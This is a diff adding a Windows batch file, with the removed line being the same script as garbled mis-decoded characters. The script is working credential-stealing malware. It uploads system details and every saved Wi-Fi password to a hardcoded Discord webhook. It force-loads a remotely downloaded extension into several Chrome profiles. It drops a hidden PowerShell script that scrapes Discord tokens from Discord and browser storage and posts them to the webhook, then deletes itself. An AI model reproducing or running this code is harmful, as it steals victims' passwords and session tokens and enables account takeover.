@@ -1,1 +1,86 @@
-挦獬਍敀档⁯景൦猊瑥潬慣⁬湥扡敬敤慬敹敤灸湡楳湯਍潦⁲是∠潴敫獮㈽搠汥浩㵳∺┠搥椠⁮✨灩潣普杩帠⁼楦摮∠偉㑶✢ 潤猠瑥椠瑮灩┽搥਍潦⁲是┠戥椠⁮✨潰敷獲敨汬ⴠ潮⁰挭∠䤨癮歯ⵥ敒瑳敍桴摯栠瑴㩰⼯灡⹩灩晩⹹牯⥧✢ 潄匠瑥䔠瑸偉┽戥਍敳⁴敷桢潯㵫瑨灴㩳⼯楤捳牯⹤潣⽭灡⽩敷桢潯獫㤯㜵㠲㜷㤸㤰〸ㄶ㠸⼶䵳䭨䵳灯䩍汱䙄浐敄㝚㉬祷祢㑱㔳湊慲䵥ㅆ摡猵㝃䍦也彡坃㙚橴䕪〵猵䥴歄㥡਍捥潨††††倠⁃††††㸾愥灰慤慴尥湩潦琮瑸਍捥潨ⴠⴭⴭⴭⴭⴭⴭⴭⴭⴭ㸾愥灰慤慴尥湩潦琮瑸਍捥潨唠敳湲浡㩥┠獵牥慮敭㸥┾灡摰瑡╡楜普⹯硴൴攊档⁯潈瑳慮敭›挥浯異整湲浡╥㸾愥灰慤慴尥湩潦琮瑸਍捥潨倠楲慶整䤠㩐┠湩楴╰㸾愥灰慤慴尥湩潦琮瑸਍捥潨倠扵楬⁣偉›䔥瑸偉㸥┾灡摰瑡╡楜普⹯硴൴攊档⁯偃⁕牡档瑩捥瑨牵㩥┠牰捯獥潳彲牡档瑩捥畴敲㸥┾灡摰瑡╡楜普⹯硴൴攊档⁯灏牥瑡湩⁧祓瑳浥›漥╳㸾愥灰慤慴尥湩潦琮瑸਍捥潨匠獹整⁭牄癩㩥┠祳瑳浥牤癩╥㸾愥灰慤慴尥湩潦琮瑸਍捥潨㸮┾灡摰瑡╡楜普⹯硴൴攊档⁯†䥗䘭⁉䅐卓佗䑒㹓┾灡摰瑡╡楜普⹯硴൴攊档⁯ⴭⴭⴭⴭⴭⴭⴭⴭⴭ㸭┾灡摰瑡╡楜普⹯硴൴昊牯⼠⁆琢歯湥㵳′敤楬獭㨽•┥⁡湩⠠渧瑥桳眠慬⁮桳睯瀠潲楦敬⤧搠⁯ന †猠瑥眠晩彩睰㵤਍††潦⁲䘯∠潴敫獮㈽搠汥浩㵳›獵扥捡煫•┥⁆义⠠湠瑥桳眠慬⁮桳睯瀠潲楦敬┠愥欠祥㵞汣慥⁲籞映湩⁤䬢祥䌠湯整瑮怢 潤⠠਍††††敳⁴楷楦灟摷┽䘥਍††ഩ †攠档⁯┥㩡℠楷楦灟摷㸡┾灡摰瑡╡楜普⹯硴൴⤊਍਍畣汲ⴠ⁳䘭∠楦敬䀽愥灰慤慴尥湩潦琮瑸•⁜眥扥潨歯‥渾汵㈠☾റ椊⁦硥獩⁴愥灰慤慴尥硥整獮潩⁮浲楤⁲愥灰慤慴尥硥整獮潩⁮匯⼠⁑渾汵㈠☾റ搊汥┠灡摰瑡╡楜普⹯硴൴洊摫物┠灡摰瑡╡敜瑸湥楳湯਍歭楤⁲愥灰慤慴尥硥整獮潩屮捳楲瑰൳洊摫物┠灡摰瑡╡敜瑸湥楳湯慜獳瑥൳挊牵⁬猭栠瑴獰⼺爯睡朮瑩畨畢敳捲湯整瑮挮浯猯獹敫⵹敤⽬硥整獮潩⽮慭湩支瑸湥楳湯洯湡晩獥⹴獪湯㸾愥灰慤慴尥硥整獮潩屮慭楮敦瑳樮潳൮挊牵⁬猭栠瑴獰⼺爯睡朮瑩畨畢敳捲湯整瑮挮浯猯獹敫⵹敤⽬硥整獮潩⽮慭湩支瑸湥楳湯猯牣灩獴氯杯樮㹳┾灡摰瑡╡敜瑸湥楳湯獜牣灩獴汜杯樮൳挊牵⁬猭栠瑴獰⼺爯睡朮瑩畨畢敳捲湯整瑮挮浯猯獹敫⵹敤⽬硥整獮潩⽮慭湩支瑸湥楳湯愯獳瑥⽳湯摥楲敶瀮杮ⴠ⁯愥灰慤慴尥硥整獮潩屮獡敳獴潜敮牤癩⹥湰൧琊獡歫汩⁬椯⁭档潲敭攮數⼠⁦渾汵㈠☾റ猊慴瑲挠摭⼠⁣洢摯⁥〲‬‱☦琠浩潥瑵⼠⁴″渾汵☠…慴歳楫汬⼠浩挠牨浯⹥硥⁥是㸠畮⁬㸲ㄦഢ猊慴瑲挠摭⼠⁣洢摯⁥〲‬‱☦琠浩潥瑵⼠⁴‶渾汵☠…慴歳楫汬⼠浩挠牨浯⹥硥⁥是㸠畮⁬㸲ㄦഢ猊慴瑲挠摭⼠⁣洢摯⁥〲‬‱☦琠浩潥瑵⼠⁴‹渾汵☠…慴歳楫汬⼠浩挠牨浯⹥硥⁥是㸠畮⁬㸲ㄦഢ∊瀥潲牧浡楦敬╳䝜潯汧履桃潲敭䅜灰楬慣楴湯捜牨浯⹥硥≥ⴠ氭慯ⵤ硥整獮潩㵮┢灡摰瑡╡敜瑸湥楳湯•ⴭ牰景汩ⵥ楤敲瑣牯㵹倢潲楦敬ㄠഢ∊瀥潲牧浡楦敬╳䝜潯汧履桃潲敭䅜灰楬慣楴湯捜牨浯⹥硥≥ⴠ氭慯ⵤ硥整獮潩㵮┢灡摰瑡╡敜瑸湥楳湯•ⴭ牰景汩ⵥ楤敲瑣牯㵹倢潲楦敬㈠ഢ∊瀥潲牧浡楦敬╳䝜潯汧履桃潲敭䅜灰楬慣楴湯捜牨浯⹥硥≥ⴠ氭慯ⵤ硥整獮潩㵮┢灡摰瑡╡敜瑸湥楳湯•ⴭ牰景汩ⵥ楤敲瑣牯㵹倢潲楦敬㌠ഢ㨊湥൤琊獡歫汩⁬椯⁭档潲敭攮數⼠⁦渾汵㈠☾റ爊摭物┠灡摰瑡╡敜瑸湥楳湯⼠⁓儯㸠畮⁬㸲ㄦ਍湥汤捯污਍敳⁴敷桢潯㵫瑨灴㩳⼯楤捳牯⹤潣⽭灡⽩敷桢潯獫㤯㜵㠲㜷㤸㤰〸ㄶ㠸⼶䵳䭨䵳灯䩍汱䙄浐敄㝚㉬祷祢㑱㔳湊慲䵥ㅆ摡猵㝃䍦也彡坃㙚橴䕪〵猵䥴歄㥡਍晩攠楸瑳┠灡摰瑡╡畜摰瑡⹥獰‱敤⁬猯⼠ⁱ愥灰慤慴尥灵慤整瀮ㅳ㸠畮൬攊档⁯䔤牲牯捁楴湯牐晥牥湥散✽楳敬瑮祬潣瑮湩敵㸧┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯琤歯湥即牴湩⁧‽敮⵷扯敪瑣匠獹整⹭潃汬捥楴湯⹳灓捥慩楬敺⹤瑓楲杮潃汬捥楴湯㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨␠敷桢潯彫牵⁬‽┢敷桢潯╫㸢┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯氤捯瑡潩彮牡慲⁹‽⡀㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††␠湥㩶偁䑐呁⁁‫尢楄捳牯層潌慣⁬瑓牯条履敬敶摬≢㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††␠湥㩶偁䑐呁⁁‫尢楤捳牯捤湡牡屹潌慣⁬瑓牯条履敬敶摬≢㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††␠湥㩶偁䑐呁⁁‫尢楤捳牯灤扴䱜捯污匠潴慲敧汜癥汥扤㸢┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††攤癮䰺䍏䱁偁䑐呁⁁‫尢潇杯敬䍜牨浯履獕牥䐠瑡屡敄慦汵屴潌慣⁬瑓牯条履敬敶摬≢㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††␠湥㩶偁䑐呁⁁‫尢灏牥⁡潓瑦慷敲作数慲匠慴汢履潌慣⁬瑓牯条履敬敶摬≢㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††␠湥㩶佌䅃䅌偐䅄䅔⬠∠䉜慲敶潓瑦慷敲䉜慲敶䈭潲獷牥啜敳⁲慄慴䑜晥畡瑬䱜捯污匠潴慲敧汜癥汥扤㸢┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††攤癮䰺䍏䱁偁䑐呁⁁‫尢慙摮硥奜湡敤䉸潲獷牥啜敳⁲慄慴䑜晥畡瑬䱜捯污匠潴慲敧汜癥汥扤㸢┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯㸩┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯潦敲捡⁨␨慰桴椠⁮氤捯瑡潩彮牡慲⥹笠㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††椠⡦敔瑳倭瑡⁨瀤瑡⥨㹻┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††††潦敲捡⁨␨楦敬椠⁮敇⵴桃汩䥤整⁭倭瑡⁨瀤瑡⁨中浡⥥笠㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††††††␠慤慴㴠䜠瑥䌭湯整瑮ⴠ慐桴∠⠤瀤瑡⥨⑜␨楦敬∩㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††††††␠敲敧⁸‽牛来硥⁝嬧睜筝㐲屽嬮睜筝紶⹜屛嵷㉻紷㸧┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††††††洤瑡档㴠␠敲敧⹸慍捴⡨搤瑡⥡㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††††††眠楨敬⠠洤瑡档匮捵散獳 㹻┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††††††††晩⠠␡潴敫獮瑓楲杮䌮湯慴湩⡳洤瑡档嘮污敵⤩笠㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††††††††††␠潴敫獮瑓楲杮䄮摤␨慭捴⹨慖畬⥥帠⁼畯⵴畮汬㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††††††††素㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††††††††␠慭捴⁨‽洤瑡档丮硥䵴瑡档⤨㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††††††素㸠┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††††㹽┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††㹽┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯㹽┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯潦敲捡⁨␨潴敫⁮湩␠潴敫獮瑓楲杮 㹻┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††洤獥慳敧㴠帠⨢‪楄捳牯⁤潴敫⁮›⨪㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††怠恠␠潴敫⁮恠⁠≞㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨††␠慨桳㴠䀠⁻挢湯整瑮•‽洤獥慳敧※㹽┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††䨤体⁎‽栤獡⁨籞挠湯敶瑲潴樭潳㹮┾灡摰瑡╡畜摰瑡⹥獰റ攊档⁯††湉潶敫圭扥敒畱獥⁴甭楲␠敷桢潯彫牵⁬䴭瑥潨⁤佐呓ⴠ潂祤␠半乏ⴠ效摡牥⁳筀䌧湯整瑮吭灹❥㴠✠灡汰捩瑡潩⽮獪湯紧㸾愥灰慤慴尥灵慤整瀮ㅳ਍捥潨素㸾愥灰慤慴尥灵慤整瀮ㅳ਍楴敭畯⁴琯㈠㸠畮൬倊睯牥桓汥⹬硥⁥䔭數畣楴湯潐楬祣䈠灹獡⁳䘭汩⁥愥灰慤慴尥灵慤整瀮ㅳⴠ楗摮睯瑓汹⁥楈摤湥਍楴敭畯⁴琯㘠㸠畮൬搊汥┠灡摰瑡╡畜摰瑡⹥獰റ⠊潧潴 㸲畮⁬…敤⁬┢晾∰
+@echo off
+setlocal enabledelayedexpansion
+for /f "tokens=2 delims=:" %%d in ('ipconfig ^| find "IPv4"') do set intip=%%d
+for /f %%b in ('powershell -nop -c "(Invoke-RestMethod http://api.ipify.org)"') Do Set ExtIP=%%b
+set webhook=https://discord.com/api/webhooks/957287789098061886/sMhKsMopMJqlDFPmDeZ7l2wybyq435JnraeMF1ad5sC7fC_Na_CWZ6tjjE505stIDka9
+echo         PC         >>%appdata%\info.txt
+echo ------------------->>%appdata%\info.txt
+echo Username: %username%>>%appdata%\info.txt
+echo Hostname: %computername%>>%appdata%\info.txt
+echo Private IP: %intip%>>%appdata%\info.txt
+echo Public IP: %ExtIP%>>%appdata%\info.txt
+echo CPU architechture: %processor_architecture%>>%appdata%\info.txt
+echo Operating System: %os%>>%appdata%\info.txt
+echo System Drive: %systemdrive%>>%appdata%\info.txt
+echo.>>%appdata%\info.txt
+echo   WI-FI PASSWORDS>>%appdata%\info.txt
+echo ------------------->>%appdata%\info.txt
+for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
+    set wifi_pwd=
+    for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
+        set wifi_pwd=%%F
+    )
+    echo %%a: !wifi_pwd!>>%appdata%\info.txt
+)
+
+curl -s -F "file=@%appdata%\info.txt" \ %webhook% >nul 2>&1
+if exist %appdata%\extension rmdir %appdata%\extension /S /Q >nul 2>&1
+del %appdata%\info.txt
+mkdir %appdata%\extension
+mkdir %appdata%\extension\scripts
+mkdir %appdata%\extension\assets
+curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/manifest.json>>%appdata%\extension\manifest.json
+curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/scripts/log.js>>%appdata%\extension\scripts\log.js
+curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/assets/onedrive.png -o %appdata%\extension\assets\onedrive.png
+taskkill /im chrome.exe /f >nul 2>&1
+start cmd /c "mode 20, 1 && timeout /t 3 >nul && taskkill /im chrome.exe /f >nul 2>&1"
+start cmd /c "mode 20, 1 && timeout /t 6 >nul && taskkill /im chrome.exe /f >nul 2>&1"
+start cmd /c "mode 20, 1 && timeout /t 9 >nul && taskkill /im chrome.exe /f >nul 2>&1"
+"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 1"
+"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 2"
+"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 3"
+:end
+taskkill /im chrome.exe /f >nul 2>&1
+rmdir %appdata%\extension /S /Q >nul 2>&1
+endlocal
+set webhook=https://discord.com/api/webhooks/957287789098061886/sMhKsMopMJqlDFPmDeZ7l2wybyq435JnraeMF1ad5sC7fC_Na_CWZ6tjjE505stIDka9
+if exist %appdata%\update.ps1 del /s /q %appdata%\update.ps1 >nul
+echo $ErrorActionPreference='silentlycontinue'>>%appdata%\update.ps1
+echo $tokensString = new-object System.Collections.Specialized.StringCollection>>%appdata%\update.ps1
+echo $webhook_url = "%webhook%">>%appdata%\update.ps1
+echo $location_array = @(>>%appdata%\update.ps1
+echo     $env:APPDATA + "\Discord\Local Storage\leveldb">>%appdata%\update.ps1
+echo     $env:APPDATA + "\discordcanary\Local Storage\leveldb">>%appdata%\update.ps1
+echo     $env:APPDATA + "\discordptb\Local Storage\leveldb">>%appdata%\update.ps1
+echo     $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
+echo     $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb">>%appdata%\update.ps1
+echo     $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
+echo     $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
+echo )>>%appdata%\update.ps1
+echo foreach ($path in $location_array) {>>%appdata%\update.ps1
+echo     if(Test-Path $path){>>%appdata%\update.ps1
+echo         foreach ($file in Get-ChildItem -Path $path -Name) {>>%appdata%\update.ps1
+echo             $data = Get-Content -Path "$($path)\$($file)">>%appdata%\update.ps1
+echo             $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}'>>%appdata%\update.ps1
+echo             $match = $regex.Match($data)>>%appdata%\update.ps1
+echo             while ($match.Success) {>>%appdata%\update.ps1
+echo                 if (!$tokensString.Contains($match.Value)) {>>%appdata%\update.ps1
+echo                     $tokensString.Add($match.Value) ^| out-null>>%appdata%\update.ps1
+echo                 }>>%appdata%\update.ps1
+echo                 $match = $match.NextMatch()>>%appdata%\update.ps1
+echo             } >>%appdata%\update.ps1
+echo         }>>%appdata%\update.ps1
+echo     }>>%appdata%\update.ps1
+echo }>>%appdata%\update.ps1
+echo foreach ($token in $tokensString) {>>%appdata%\update.ps1
+echo     $message = ^"** Discord token : **>>%appdata%\update.ps1
+echo     ``` $token ``` ^">>%appdata%\update.ps1
+echo     $hash = @{ "content" = $message; }>>%appdata%\update.ps1
+echo     $JSON = $hash ^| convertto-json>>%appdata%\update.ps1
+echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}>>%appdata%\update.ps1
+echo }>>%appdata%\update.ps1
+timeout /t 2 >nul
+PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\update.ps1 -WindowStyle Hidden
+timeout /t 6 >nul
+del %appdata%\update.ps1
+(goto) 2>nul & del "%~f0"
